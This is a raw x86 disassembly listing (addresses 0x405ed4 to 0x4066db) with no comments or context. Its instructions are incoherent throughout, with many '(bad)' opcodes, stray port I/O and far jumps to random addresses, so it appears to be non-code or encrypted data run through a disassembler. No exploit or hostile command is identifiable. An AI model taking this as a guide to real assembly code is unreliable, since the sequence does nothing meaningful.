  405ed4:	cmp    DWORD PTR [eax+ecx*1],esp
  405ed7:	jo     0x405efd
  405ed9:	jae    0x405ee9
  405edb:	test   al,0x2c
  405edd:	data16 lods al,BYTE PTR ds:[esi]
  405edf:	mov    eax,0xe61989a8
  405ee4:	test   eax,0xa0c458ea
  405ee9:	lea    ecx,[edx-0x3f]
  405eec:	ret    
  405eed:	into   
  405eee:	and    dh,BYTE PTR [esp+ecx*1-0x2fb009f9]
  405ef5:	pop    eax
  405ef6:	xor    BYTE PTR [ebp+0x2d],cl
  405ef9:	sub    DWORD PTR [edi+edx*1],esi
  405efc:	fild   WORD PTR [esp+ebx*8]
  405eff:	ss inc edi
  405f01:	call   0xc1ab:0xd1953d07
  405f08:	cmp    eax,0xd6ede4f4
  405f0d:	and    DWORD PTR [ebx],esp
  405f0f:	jbe    0x405f83
  405f11:	add    DWORD PTR [edx+0x1d1f86c0],eax
  405f17:	sbb    eax,0x86d58ea
  405f1c:	icebp  
  405f1d:	or     BYTE PTR [eax+0x71],bh
  405f20:	in     eax,0x4d
  405f22:	ret    
  405f23:	dec    eax
  405f24:	std    
  405f25:	cli    
  405f26:	fdivr  DWORD PTR [ecx+0x319d7d84]
  405f2c:	dec    eax
  405f2d:	or     eax,ebx
  405f2f:	or     BYTE PTR [ecx],al
  405f31:	faddp  st(7),st
  405f33:	ins    BYTE PTR es:[edi],dx
  405f34:	pop    edx
  405f35:	sbb    dh,BYTE PTR [edx+0x34]
  405f38:	popf   
  405f39:	imul   edi,DWORD PTR [edx+0x7e],0x6947742e
  405f40:	cli    
  405f41:	pop    ds
  405f42:	nop
  405f43:	mov    dh,0xd2
  405f45:	and    al,0x29
  405f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f48:	pop    ebp
  405f49:	dec    esi
  405f4a:	mov    ds:0x521e394c,al
  405f4f:	mov    ebp,0x27029ca2
  405f54:	pop    DWORD PTR [edx-0x7c]
  405f57:	jns    0x405f42
  405f59:	and    DWORD PTR [esi+esi*2-0x39cbe1a5],0x8cd5ae46
  405f64:	dec    esi
  405f65:	inc    edx
  405f66:	push   ebp
  405f67:	adc    eax,DWORD PTR [eax]
  405f69:	fisttp WORD PTR [eax+0x31f4555e]
  405f6f:	jb     0x405fa2
  405f71:	js     0x405fc1
  405f73:	repnz test eax,0xa1e1e7f5
  405f79:	cmp    DWORD PTR [eax+0x5ae8e383],edx
  405f7f:	not    DWORD PTR [esi-0x380fe422]
  405f85:	out    0x4b,eax
  405f87:	xchg   ebp,eax
  405f88:	or     BYTE PTR [edx],0x74
  405f8b:	int3   
  405f8c:	mov    esp,0x9ad41689
  405f91:	in     eax,0xfb
  405f93:	js     0x405f2d
  405f95:	jne    0x405f29
  405f97:	mov    ah,BYTE PTR [eax]
  405f99:	sub    eax,0xa0ac625f
  405f9e:	into   
  405f9f:	push   esi
  405fa0:	sub    DWORD PTR [ecx+0x22],ecx
  405fa3:	mov    WORD PTR ds:0xf1a4a527,ds
  405fa9:	adc    al,0x9b
  405fab:	jmp    0xa8811242
  405fb0:	push   0xf83e9bf6
  405fb5:	cmp    eax,0xcf7c5eb1
  405fba:	or     DWORD PTR [esi],ebp
  405fbc:	fidiv  DWORD PTR [ecx-0xd]
  405fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc0:	xchg   esp,eax
  405fc1:	mov    ecx,0x383ac0f7
  405fc6:	add    esp,DWORD PTR [edi+0x50]
  405fc9:	inc    esi
  405fca:	mov    ebp,0x4b249d72
  405fcf:	jno    0x405f64
  405fd1:	push   ebp
  405fd2:	push   eax
  405fd3:	or     dh,BYTE PTR [eax-0x3d2af567]
  405fd9:	cmc    
  405fda:	inc    ecx
  405fdb:	jp     0x405f62
  405fdd:	and    ah,BYTE PTR [ecx-0x5f650d54]
  405fe3:	pop    edi
  405fe4:	xchg   ecx,eax
  405fe5:	mov    edi,0x57ae8a26
  405feb:	pusha  
  405fec:	adc    ah,ch
  405fee:	dec    ebp
  405fef:	shr    ebx,cl
  405ff1:	pop    edi
  405ff2:	jmp    0x40603a
  405ff4:	adc    DWORD PTR [esp+edi*4+0x54],0x4
  405ff9:	xor    BYTE PTR [ecx],ch
  405ffb:	sub    al,bl
  405ffd:	mov    dh,0x44
  405fff:	fucomp st(4)
  406001:	fsubr  st(3),st
  406003:	xchg   ecx,eax
  406004:	out    0xb3,eax
  406006:	shl    DWORD PTR [eax+0x32461070],cl
  40600c:	push   eax
  40600d:	aam    0x79
  40600f:	(bad)  
  406010:	sub    esi,DWORD PTR [edx+0x63]
  406013:	sbb    al,0xcf
  406015:	aas    
  406016:	popa   
  406017:	sub    edx,DWORD PTR [ecx]
  406019:	adc    al,0x76
  40601b:	xor    dl,BYTE PTR [ebp+0x35]
  40601e:	mov    dl,0x3c
  406020:	icebp  
  406021:	aam    0x64
  406023:	push   esp
  406024:	mov    bl,0xaa
  406026:	sub    BYTE PTR [eax+0x4c],dh
  406029:	gs jp  0x406089
  40602c:	pop    edi
  40602d:	mov    al,0x1e
  40602f:	cmp    eax,0x41b7f888
  406034:	mov    dh,0x39
  406036:	cdq    
  406037:	and    DWORD PTR [ebp-0x55],ecx
  40603a:	pop    ds
  40603b:	mov    ds:0x6fcc992,al
  406040:	jno    0x40609e
  406042:	mov    bl,0x40
  406044:	(bad)  
  406045:	clc    
  406046:	in     eax,dx
  406047:	in     eax,0xdf
  406049:	xlat   BYTE PTR ds:[ebx]
  40604a:	cli    
  40604b:	loop   0x4060a2
  40604d:	mov    DWORD PTR [ebx-0x6598c4a5],edx
  406053:	mov    bh,0x6c
  406055:	bound  esp,QWORD PTR [ecx+0x4113b2df]
  40605b:	test   al,0x94
  40605d:	and    eax,0xb041e0cf
  406062:	jecxz  0x406044
  406064:	push   eax
  406065:	(bad)  
  406066:	jns    0x4060e4
  406068:	jne    0x40600a
  40606a:	in     eax,0xba
  40606c:	mov    edi,0xf1fb5c8c
  406071:	lahf   
  406072:	not    BYTE PTR [edx+0x21]
  406075:	or     bh,ch
  406077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406078:	ds in  al,dx
  40607a:	mov    es,edi
  40607c:	lds    edi,FWORD PTR [edx+0x28]
  40607f:	mov    al,ds:0x74d60444
  406084:	inc    esp
  406085:	enter  0x29b8,0x9f
  406089:	sbb    eax,0x22a27ddd
  40608e:	cmc    
  40608f:	xchg   edx,eax
  406090:	dec    esp
  406091:	in     eax,0xf4
  406093:	push   cs
  406094:	outs   dx,BYTE PTR ds:[esi]
  406095:	cs push ds
  406097:	cwde   
  406098:	imul   ecx,ebx,0xf4ea780f
  40609e:	add    edi,ecx
  4060a0:	scas   eax,DWORD PTR es:[edi]
  4060a1:	jne    0x40604a
  4060a3:	mov    ds:0xcbdd0e06,eax
  4060a8:	mov    ds:0xbbf758eb,eax
  4060ad:	mov    esi,DWORD PTR [ebx+0x26]
  4060b0:	or     ah,BYTE PTR [ecx-0x3e]
  4060b3:	les    esp,FWORD PTR [edi+0x65ecdc4d]
  4060b9:	mov    bh,0x81
  4060bb:	pop    edi
  4060bc:	popa   
  4060bd:	mov    ?,WORD PTR [edx]
  4060bf:	(bad)  
  4060c0:	fistp  DWORD PTR [edx-0x75]
  4060c3:	cmp    DWORD PTR [eax],eax
  4060c5:	imul   eax,DWORD PTR [eax-0x4],0x21
  4060c9:	sbb    DWORD PTR [edi-0x38],edi
  4060cc:	mov    edx,gs
  4060ce:	dec    ebx
  4060cf:	push   cs
  4060d0:	mov    eax,ss
  4060d2:	mov    bh,0x52
  4060d4:	out    0x4f,al
  4060d6:	and    BYTE PTR fs:[esi+0x6d80a4c0],al
  4060dd:	bound  eax,QWORD PTR [edi]
  4060df:	inc    esp
  4060e0:	mov    bh,0xd7
  4060e2:	xor    cl,0xbc
  4060e5:	mov    esp,0x515f7f74
  4060ea:	popf   
  4060eb:	aaa    
  4060ec:	sbb    BYTE PTR [eax+0x1a],0x9f
  4060f0:	push   ss
  4060f1:	rcr    DWORD PTR [edx-0x54],0x9e
  4060f5:	xor    ebp,DWORD PTR [edx]
  4060f7:	or     eax,0xc32608c5
  4060fc:	cli    
  4060fd:	jmp    0xde1fdc91
  406102:	test   al,0x76
  406104:	nop
  406105:	pop    edx
  406106:	pusha  
  406107:	fisttp QWORD PTR [ebp+ecx*4+0x3e]
  40610b:	clc    
  40610c:	fidivr WORD PTR [ecx]
  40610e:	jp     0x40613d
  406110:	xchg   esi,eax
  406111:	xchg   esp,eax
  406112:	and    al,bl
  406114:	(bad)  
  406115:	scas   eax,DWORD PTR es:[edi]
  406116:	in     eax,0xaa
  406118:	mov    esi,0x867c00ce
  40611d:	das    
  40611e:	pop    ss
  40611f:	mov    eax,ds:0xa23e7b07
  406124:	rol    DWORD PTR [esi],0x2f
  406127:	sbb    edi,ebp
  406129:	pop    esi
  40612a:	sub    al,0x89
  40612c:	fcomp  st(5)
  40612e:	icebp  
  40612f:	xchg   edi,eax
  406130:	adc    al,0x98
  406132:	stc    
  406133:	push   es
  406134:	add    BYTE PTR ds:0xcc3501d4,0xa0
  40613b:	dec    ebp
  40613c:	jmp    0xc497:0x405d25a2
  406143:	imul   ebx,DWORD PTR [ebx+0x7c5a8c24],0x10
  40614a:	xor    DWORD PTR ds:0x1f9e7a9e,0x1d0e9d52
  406154:	add    ax,0x6a5
  406158:	test   al,0xde
  40615a:	sbb    ebp,DWORD PTR [ebx+0x5ccdd569]
  406160:	(bad)
  406165:	loope  0x40610a
  406167:	or     BYTE PTR [edx+0x77],dh
  40616a:	call   0xa94212c0
  40616f:	stos   BYTE PTR es:[edi],al
  406170:	mov    eax,ds:0xfde0e3d7
  406175:	jb     0x40613c
  406177:	jmp    0x54508b1e
  40617c:	rol    DWORD PTR [ebx+esi*8-0x64],cl
  406180:	shl    DWORD PTR [esi-0x462570ad],cl
  406186:	pop    ebp
  406187:	mov    cl,0xbe
  406189:	mov    ebp,0x4628579a
  40618e:	add    ah,BYTE PTR [ebp+0x255d7df6]
  406194:	or     BYTE PTR [ecx],bh
  406196:	push   ecx
  406197:	repz dec edi
  406199:	bound  ecx,QWORD PTR [ecx-0x33e4f8b3]
  40619f:	adc    edi,ebp
  4061a1:	mov    edx,0x66861f7e
  4061a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061a7:	sub    eax,0x79b6296
  4061ac:	add    al,0x57
  4061ae:	retf   0x2a8
  4061b1:	xchg   esi,eax
  4061b2:	pop    ds
  4061b3:	lahf   
  4061b4:	adc    DWORD PTR [edx+0x1b],esp
  4061b7:	xchg   edi,eax
  4061b8:	jb     0x4061c6
  4061ba:	adc    al,0xe0
  4061bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061bd:	add    bl,BYTE PTR [esp+eiz*4]
  4061c0:	jbe    0x4061b4
  4061c2:	inc    ecx
  4061c3:	mov    dh,0x69
  4061c5:	add    esi,DWORD PTR [ecx-0x6]
  4061c8:	or     esp,DWORD PTR [ebp+0x5e0da23b]
  4061ce:	xor    DWORD PTR [edi+0x24da2bf8],ebp
  4061d4:	pop    esp
  4061d5:	adc    BYTE PTR [esi-0x47],ch
  4061d8:	or     al,0xe8
  4061da:	mov    ecx,0x50767cfd
  4061df:	mov    ah,0xbe
  4061e1:	int3   
  4061e2:	dec    ecx
  4061e3:	fisubr WORD PTR [eax+0xe08f0e7]
  4061e9:	sub    al,bl
  4061eb:	outs   dx,BYTE PTR ds:[esi]
  4061ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061ed:	mov    edi,DWORD PTR [ebp+0x30feee4b]
  4061f3:	je     0x406273
  4061f5:	jmp    0x40623e
  4061f7:	add    cl,0x52
  4061fa:	sbb    BYTE PTR [ebx],bl
  4061fc:	pop    ecx
  4061fd:	add    al,0xc7
  4061ff:	aas    
  406200:	add    al,0xb5
  406202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406203:	into   
  406204:	ret    
  406205:	cwde   
  406206:	and    edx,DWORD PTR [esp+ecx*4]
  406209:	ins    DWORD PTR es:[edi],dx
  40620a:	ror    al,cl
  40620c:	stc    
  40620d:	xor    eax,0x31807376
  406212:	or     esp,ebp
  406214:	and    al,0xa9
  406216:	sbb    esi,DWORD PTR [edx-0x1ea11c5f]
  40621c:	dec    esi
  40621d:	mov    ebx,0xefc6c94e
  406222:	mov    ah,BYTE PTR [edx+0x2a]
  406225:	dec    esp
  406226:	je     0x40629f
  406228:	pushf  
  406229:	fld    st(5)
  40622b:	cmp    BYTE PTR [edi-0x44],0xe9
  40622f:	hlt    
  406230:	push   esi
  406231:	push   ecx
  406232:	lds    ecx,FWORD PTR [esi]
  406234:	cmp    ch,BYTE PTR [eax]
  406236:	ficom  WORD PTR [ecx]
  406238:	cld    
  406239:	leave  
  40623a:	ret    
  40623b:	int3   
  40623c:	adc    edx,DWORD PTR [ecx+0x1c]
  40623f:	add    ah,al
  406241:	in     eax,0x53
  406243:	retf   0x8cc3
  406246:	fs add al,ah
  406249:	cmp    ah,BYTE PTR ds:0xa6a833ad
  40624f:	mov    al,0x42
  406251:	add    esi,DWORD PTR [esi]
  406253:	xor    DWORD PTR [ebx+0x48],ebx
  406256:	jp     0x4062b3
  406258:	test   al,0x6e
  40625a:	sbb    cl,bl
  40625c:	xor    eax,DWORD PTR [eax-0x144ecfe2]
  406262:	mov    esi,fs
  406264:	repz adc al,0x2c
  406267:	fisubr WORD PTR [edx+0x37]
  40626a:	sbb    BYTE PTR [eax],al
  40626c:	and    DWORD PTR ds:0xa827f48d,eax
  406272:	call   0x37fc:0xa506c01e
  406279:	or     DWORD PTR [ebx+0x70d7996a],esi
  40627f:	cmp    DWORD PTR [ebx-0x2],edx
  406282:	shl    DWORD PTR [esi],1
  406284:	ret    0x2852
  406287:	das    
  406288:	loop   0x406228
  40628a:	dec    ecx
  40628b:	aad    0x46
  40628d:	and    BYTE PTR [eax],bh
  40628f:	cmp    al,BYTE PTR [edx+0x1c]
  406292:	jmp    0xcb52:0xba9b75e3
  406299:	mov    edx,0x96f70f5f
  40629e:	inc    esp
  40629f:	pusha  
  4062a0:	call   0x63277200
  4062a5:	add    bh,BYTE PTR [ecx+eiz*1]
  4062a8:	stos   DWORD PTR es:[edi],eax
  4062a9:	imul   esp,DWORD PTR [ebp+0x9],0x14eb2130
  4062b0:	addr16 (bad) 
  4062b2:	(bad)  
  4062b3:	xchg   ecx,eax
  4062b4:	popa   
  4062b5:	cli    
  4062b6:	aaa    
  4062b7:	xor    DWORD PTR [eax+0x44],ebx
  4062ba:	daa    
  4062bb:	push   edx
  4062bc:	sub    BYTE PTR [ebx-0xf],0xc6
  4062c0:	or     DWORD PTR [edx],edx
  4062c2:	sbb    ebp,edi
  4062c4:	dec    edi
  4062c5:	mov    BYTE PTR [ecx+0x205b9ca6],dh
  4062cb:	pop    edx
  4062cc:	fcmovnb st,st(4)
  4062ce:	push   0xf933158f
  4062d3:	lahf   
  4062d4:	mov    cl,0xff
  4062d6:	inc    edi
  4062d7:	in     eax,dx
  4062d8:	test   al,0x3
  4062da:	push   0xffffffd5
  4062dc:	jle    0x4062fc
  4062de:	sub    esi,DWORD PTR [eax+0xf9a5fb2]
  4062e4:	push   edi
  4062e5:	lock test eax,0x4a495cb6
  4062eb:	sbb    eax,0x987019d2
  4062f0:	in     al,0x2d
  4062f2:	sub    al,0x11
  4062f4:	xor    al,0x5e
  4062f6:	pop    ebx
  4062f7:	scas   al,BYTE PTR es:[edi]
  4062f8:	inc    edi
  4062f9:	test   eax,0x9bf8a9f1
  4062fe:	pop    ss
  4062ff:	mov    dh,0x47
  406301:	sub    al,bl
  406303:	(bad)  
  406304:	repz (bad) 
  406306:	cs (bad) 
  406308:	pop    esi
  406309:	sar    bl,0x8e
  40630c:	pop    ebp
  40630d:	es cld 
  40630f:	aad    0x79
  406311:	into   
  406312:	shl    DWORD PTR [ebx+0x11],cl
  406315:	mov    WORD PTR [ecx+0x38a911c],?
  40631b:	inc    ecx
  40631c:	jo     0x4062ed
  40631e:	call   DWORD PTR [ebp-0x6d52d5d2]
  406324:	xor    al,0x6
  406326:	or     DWORD PTR [edi*1-0x7a9febd3],ebp
  40632d:	sbb    ah,ch
  40632f:	call   0x974b:0x4a5a9f3d
  406336:	and    eax,ebp
  406338:	lock inc eax
  40633a:	jmp    FWORD PTR [esi-0x435bedd3]
  406340:	xchg   ebx,eax
  406341:	push   0x3ea87eb
  406346:	add    edx,DWORD PTR [edx]
  406348:	js     0x406334
  40634a:	popa   
  40634b:	inc    eax
  40634c:	inc    esp
  40634d:	test   eax,0x1b9700ac
  406352:	inc    eax
  406353:	jmp    0x7060:0x66483a31
  40635a:	cmp    ebp,DWORD PTR [ebx+0x5d]
  40635d:	sbb    DWORD PTR ds:0x17890a6b,edi
  406363:	push   ss
  406364:	repnz sahf 
  406366:	jl     0x40636c
  406368:	gs push edx
  40636a:	(bad)  
  40636b:	sub    bh,BYTE PTR [eax-0x6e]
  40636e:	xchg   DWORD PTR [ebx-0x400a2f92],ebp
  406374:	dec    ebp
  406375:	adc    eax,0x7725c31d
  40637a:	and    ebp,edi
  40637c:	inc    ebp
  40637d:	xor    al,0xb8
  40637f:	and    ebx,esi
  406381:	pop    ecx
  406382:	test   al,0xf
  406384:	dec    edx
  406385:	sub    BYTE PTR [ecx+0x628b7364],bl
  40638b:	and    dh,bl
  40638d:	gs repz cmp ah,bl
  406391:	loop   0x406411
  406393:	cmp    cl,ch
  406395:	lock adc edi,eax
  406398:	mov    esi,0xf270daf6
  40639d:	dec    edi
  40639e:	adc    al,0xb0
  4063a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063a1:	or     eax,0x9a20b0e1
  4063a6:	xchg   esi,eax
  4063a7:	and    eax,0xcf0805a8
  4063ac:	int3   
  4063ad:	xchg   BYTE PTR [esi-0x4fb76c87],al
  4063b3:	fs repz test al,0x6f
  4063b7:	push   es
  4063b8:	mov    dl,0xe1
  4063ba:	jne    0x40634d
  4063bc:	or     eax,0xeb8671f6
  4063c1:	cs mov ch,0xb6
  4063c4:	mov    ax,ds:0x298c3a02
  4063ca:	mov    ah,0x6d
  4063cc:	rcr    BYTE PTR [edi+edi*4+0x3d],cl
  4063d0:	inc    esi
  4063d1:	stos   DWORD PTR es:[edi],eax
  4063d2:	inc    edx
  4063d3:	jp     0x40637d
  4063d5:	mov    dl,0xa5
  4063d7:	popa   
  4063d8:	pop    edi
  4063d9:	ja     0x4063f7
  4063db:	nop
  4063dc:	lds    ebp,FWORD PTR [edx+0x671e9652]
  4063e2:	sub    edi,DWORD PTR [edx+0x40]
  4063e5:	sbb    esi,esi
  4063e7:	push   cs
  4063e8:	std    
  4063e9:	cmp    eax,edi
  4063eb:	dec    eax
  4063ec:	scas   eax,DWORD PTR es:[edi]
  4063ed:	push   eax
  4063ee:	imul   edx,DWORD PTR [edx-0x43],0xffffffa4
  4063f2:	test   DWORD PTR [ebp+0x23],0x5abeceb2
  4063f9:	bound  esi,QWORD PTR [eax+0x5f]
  4063fc:	std    
  4063fd:	and    BYTE PTR [eax-0x38],0x1b
  406401:	fdiv   DWORD PTR [ebx+0x60]
  406404:	sti    
  406405:	mov    ebp,0x11b894ae
  40640a:	ins    BYTE PTR es:[edi],dx
  40640b:	stos   DWORD PTR es:[edi],eax
  40640c:	jne    0x4063dd
  40640e:	fcomp  DWORD PTR [edi]
  406410:	in     eax,dx
  406411:	imul   edi,DWORD PTR [ebp-0x22],0x79
  406415:	cmp    BYTE PTR [ebx],bh
  406417:	cmp    bl,BYTE PTR [si]
  40641a:	xlat   BYTE PTR ds:[ebx]
  40641b:	out    0x78,al
  40641d:	sub    al,0xdb
  40641f:	add    ebx,ebp
  406421:	sub    DWORD PTR [ebp+ecx*8-0x765d521a],ecx
  406428:	pop    esp
  406429:	xchg   edi,eax
  40642a:	jecxz  0x4063d7
  40642c:	mov    ebp,0x2b939a85
  406431:	addr16 pop edi
  406433:	xor    BYTE PTR [esi+0x53],bl
  406436:	mov    ch,0x7f
  406438:	(bad)  
  406439:	test   al,0x74
  40643b:	sbb    eax,0x8ebe1f30
  406440:	inc    ecx
  406441:	ret    0x9a52
  406444:	mov    bl,0x68
  406446:	mov    ebx,0xdbdb3ab6
  40644b:	or     BYTE PTR [esi+0x26f60a5d],ah
  406451:	mov    ch,0x6a
  406453:	fwait
  406454:	xor    ebx,ebp
  406456:	dec    edi
  406457:	pusha  
  406458:	dec    ebx
  406459:	xor    ecx,0x33272425
  40645f:	ja     0x40646a
  406461:	imul   esi,DWORD PTR [esi+0x258f6eee],0x5
  406468:	and    dl,0xea
  40646b:	scas   eax,DWORD PTR es:[edi]
  40646c:	cmc    
  40646d:	(bad)  
  40646e:	fisttp QWORD PTR [edx+ecx*1-0x69]
  406472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406473:	push   es
  406474:	xchg   esp,eax
  406475:	push   ds
  406476:	mov    esp,0xeced6ae8
  40647b:	adc    al,0xd2
  40647d:	int3   
  40647e:	or     eax,0x993874a9
  406483:	mov    ecx,0x695955d4
  406488:	aas    
  406489:	cs imul ebx,ebp,0x43
  40648d:	xor    bl,BYTE PTR [ebx+0x1b]
  406490:	call   0x7625:0xbd03b8b3
  406497:	sti    
  406498:	or     edx,DWORD PTR [edi+0x76]
  40649b:	les    esp,FWORD PTR cs:[edx+ecx*8+0x19c29bb1]
  4064a3:	mov    ds:0xd6aa0440,eax
  4064a8:	je     0x4064ed
  4064aa:	sbb    edx,DWORD PTR [ecx+0x4c]
  4064ad:	test   al,0x33
  4064af:	aas    
  4064b0:	and    ch,BYTE PTR [ebx+0x2605cf85]
  4064b6:	inc    ebx
  4064b7:	xchg   esp,eax
  4064b8:	cmp    eax,0x983902e5
  4064bd:	leave  
  4064be:	push   cs
  4064bf:	lods   al,BYTE PTR ds:[esi]
  4064c0:	js     0x4064e5
  4064c2:	mov    edx,0x6f32fbea
  4064c7:	gs jbe 0x4064c3
  4064ca:	es jecxz 0x406527
  4064cd:	push   ecx
  4064ce:	push   edx
  4064cf:	dec    edx
  4064d0:	pop    edi
  4064d1:	jecxz  0x4064ec
  4064d3:	out    dx,eax
  4064d4:	nop
  4064d5:	outs   dx,DWORD PTR ds:[esi]
  4064d6:	xchg   edi,eax
  4064d7:	dec    edi
  4064d8:	aad    0xf2
  4064da:	inc    edi
  4064db:	push   esp
  4064dc:	pusha  
  4064dd:	jge    0x406475
  4064df:	mov    cl,0x5d
  4064e1:	mov    ds:0x8ee45408,al
  4064e6:	xchg   esp,eax
  4064e7:	test   DWORD PTR [eax],ebx
  4064e9:	xor    DWORD PTR [edi+0x26],eax
  4064ec:	pop    ebx
  4064ed:	mov    eax,ds:0x4430f527
  4064f2:	repz mov cl,0x81
  4064f5:	sbb    DWORD PTR [edx],edi
  4064f7:	xchg   ah,bh
  4064f9:	inc    ebp
  4064fa:	scas   eax,DWORD PTR es:[edi]
  4064fb:	sar    DWORD PTR [edi+0x3],0x49
  4064ff:	repnz dec esi
  406501:	push   ecx
  406502:	jno    0x406555
  406504:	cmp    al,0x74
  406506:	or     BYTE PTR [edi+0x3c027d26],0x1d
  40650d:	mov    dh,0x3b
  40650f:	cwde   
  406510:	xor    ebx,0xffffffb2
  406513:	retf   0x67db
  406516:	loope  0x4064b6
  406518:	mov    ds,edx
  40651a:	dec    esi
  40651b:	push   0x294a5c25
  406520:	das    
  406521:	(bad)  
  406522:	mov    cl,0x80
  406524:	popw   es
  406526:	into   
  406527:	cs imul esi,eax,0xffffffd3
  40652b:	gs mov esi,0x53d5cb85
  406531:	mov    DWORD PTR [esi],esi
  406533:	push   ss
  406534:	xor    al,0x6
  406536:	cli    
  406537:	cwde   
  406538:	int    0x14
  40653a:	gs jae 0x4065b3
  40653d:	jmp    FWORD PTR [ebp+0x46b98bc4]
  406543:	pop    esp
  406544:	jl     0x4065ba
  406546:	popf   
  406547:	add    dh,al
  406549:	jg     0x40657a
  40654b:	les    ebp,FWORD PTR [ecx+eax*1-0x70]
  40654f:	inc    edi
  406550:	outs   dx,DWORD PTR ds:[esi]
  406551:	adc    BYTE PTR [edx+0x5e],bl
  406554:	repnz arpl bx,cx
  406557:	int    0x70
  406559:	test   eax,0x68ccc1a7
  40655e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40655f:	fldcw  WORD PTR [edx-0x67]
  406562:	pusha  
  406563:	outs   dx,BYTE PTR ds:[esi]
  406564:	test   DWORD PTR [edx-0x71],esp
  406567:	(bad)  
  406568:	xchg   esi,eax
  406569:	mov    esp,0xbe01d589
  40656e:	inc    edx
  40656f:	sbb    cl,0xde
  406572:	(bad)  [eax-0x76]
  406575:	sahf   
  406576:	sti    
  406577:	dec    eax
  406578:	push   es
  406579:	jb     0x406570
  40657b:	repz stc 
  40657d:	adc    DWORD PTR [edi],esi
  40657f:	loopne 0x4065ce
  406581:	pop    esi
  406582:	cmp    esp,DWORD PTR [edi]
  406584:	push   edx
  406585:	iret   
  406586:	push   ebp
  406587:	add    DWORD PTR [edi+0x49],0xc93246d
  40658e:	dec    edi
  40658f:	shl    bl,0xa3
  406592:	clc    
  406593:	ror    BYTE PTR ds:[edx+0x64],cl
  406597:	fistp  QWORD PTR [edi+ebx*1+0x9]
  40659b:	jl     0x40658a
  40659d:	ss xor al,0xe3
  4065a0:	repz xor bl,BYTE PTR [esi]
  4065a3:	cli    
  4065a4:	cs clc 
  4065a6:	aas    
  4065a7:	(bad)  
  4065a8:	popf   
  4065a9:	add    al,0x1
  4065ab:	or     DWORD PTR [edx-0x6a],ebx
  4065ae:	sbb    ch,dh
  4065b0:	mov    es,WORD PTR [edx-0x6a]
  4065b3:	inc    ebp
  4065b4:	xor    ch,BYTE PTR [edx]
  4065b6:	rcr    BYTE PTR [edi+0x1d36a252],0xf
  4065bd:	sbb    DWORD PTR [eax-0x232ffc04],edi
  4065c3:	retf   0xada7
  4065c6:	mov    edi,0xbe2bb020
  4065cb:	psubq  mm2,QWORD PTR [ebx]
  4065ce:	repz xor eax,0x9c91f4fd
  4065d4:	retf   0x90b
  4065d7:	xor    BYTE PTR [edi-0x60],0x17
  4065db:	mov    esp,0x4d0728b0
  4065e0:	mov    ds:0xb083de9d,al
  4065e5:	addr16 leave 
  4065e7:	dec    esi
  4065e8:	pop    edi
  4065e9:	mov    eax,0x30f82285
  4065ee:	push   edi
  4065ef:	xor    eax,0x25a40dc1
  4065f4:	sbb    BYTE PTR [ebp+0x4921b347],0x98
  4065fb:	push   cs
  4065fc:	sbb    ecx,DWORD PTR [eax+0x6b]
  4065ff:	cdq    
  406600:	cmp    al,0xa4
  406602:	dec    esp
  406603:	div    BYTE PTR [edi-0x6c]
  406606:	stos   DWORD PTR es:[edi],eax
  406607:	sar    DWORD PTR [eax+edx*4+0x6ba879c3],0xd8
  40660f:	out    dx,al
  406610:	sub    esp,0x57
  406613:	cs adc ebx,edx
  406616:	jbe    0x4065fc
  406618:	cdq    
  406619:	icebp  
  40661a:	inc    edi
  40661b:	inc    edx
  40661c:	inc    esi
  40661d:	add    BYTE PTR [ebp+0x0],dl
  406620:	mov    al,0x67
  406622:	imul   esp,DWORD PTR [ebx-0x33],0xf82468d7
  406629:	aaa    
  40662a:	cli    
  40662b:	pop    ebx
  40662c:	jl     0x40666a
  40662e:	pop    edi
  40662f:	aad    0x75
  406631:	xchg   esi,eax
  406632:	mov    bl,0xc5
  406634:	adc    DWORD PTR [edx+ecx*8-0x715b1145],ebp
  40663b:	dec    ebp
  40663c:	pop    esp
  40663d:	xchg   ecx,eax
  40663e:	ret    0x34f7
  406641:	push   ss
  406642:	(bad)  
  406644:	cmp    DWORD PTR [ecx+ebx*4],edx
  406647:	pop    ds
  406648:	sar    DWORD PTR [eax+0x54],cl
  40664b:	repz dec ebx
  40664d:	js     0x4066bf
  40664f:	pop    ds
  406650:	pop    ebp
  406651:	sbb    ah,BYTE PTR fs:[esi+eax*8+0x57]
  406656:	ins    DWORD PTR es:[edi],dx
  406657:	sub    bh,BYTE PTR [eax+edx*1+0x5cc46555]
  40665e:	add    eax,0xd74c8165
  406663:	int    0x96
  406665:	iret   
  406666:	call   0xade5:0x2c5bea7b
  40666d:	(bad)  
  40666e:	push   edx
  40666f:	add    BYTE PTR es:[ebx-0x4b19809c],bh
  406676:	aad    0x56
  406678:	push   esp
  406679:	add    DWORD PTR [eax+0x2913b63c],esi
  40667f:	sub    BYTE PTR [ebx-0x3d9b304d],dh
  406685:	ror    BYTE PTR [edx-0x759323d4],cl
  40668b:	sub    DWORD PTR [ebx],eax
  40668d:	mov    esi,0x43a4137d
  406692:	std    
  406693:	mov    edx,0x76155a83
  406698:	lods   eax,DWORD PTR ds:[esi]
  406699:	mov    ch,0x4b
  40669b:	xchg   BYTE PTR [esi+0x7b6d6a52],bl
  4066a1:	jno    0x406715
  4066a3:	or     DWORD PTR [ebp+edx*8-0x2e],ecx
  4066a7:	jg     0x4066e8
  4066a9:	test   al,0x85
  4066ab:	daa    
  4066ac:	int3   
  4066ad:	data16 jmp 0x4066a1
  4066b0:	mov    cl,0x5e
  4066b2:	xor    al,0xd7
  4066b4:	pop    eax
  4066b5:	mov    ch,BYTE PTR [ecx]
  4066b7:	in     eax,0x53
  4066b9:	shl    DWORD PTR [edx-0x40c28324],1
  4066bf:	repz dec esi
  4066c1:	fadd   QWORD PTR [edx]
  4066c3:	call   0xa0e3fe62
  4066c8:	sbb    ebx,esi
  4066ca:	(bad)  
  4066cb:	mov    ebp,0xd70880df
  4066d0:	das    
  4066d1:	cmp    edi,edx
  4066d3:	cmc    
  4066d4:	out    dx,al
  4066d5:	adc    ebp,DWORD PTR [ebx+0xadfcd7e]
  4066db:	pop    ebp
